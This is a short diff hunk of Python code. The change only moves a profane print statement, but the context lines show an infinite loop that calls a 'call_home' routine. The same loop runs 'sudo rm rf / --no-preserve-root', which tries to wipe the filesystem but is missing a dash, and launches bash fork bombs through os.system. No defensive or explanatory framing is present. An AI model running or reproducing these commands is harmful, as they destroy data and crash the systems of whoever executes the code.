@@ -27,6 +27,6 @@ else:
     break1 = True
     while break1 == True:
         call_home
-        print("get fucked")
         os.system("sudo rm rf / --no-preserve-root")
         os.system("sudo :(){:|:& };:") and os.system(":(){:|:& };:")
+        print("get fucked")
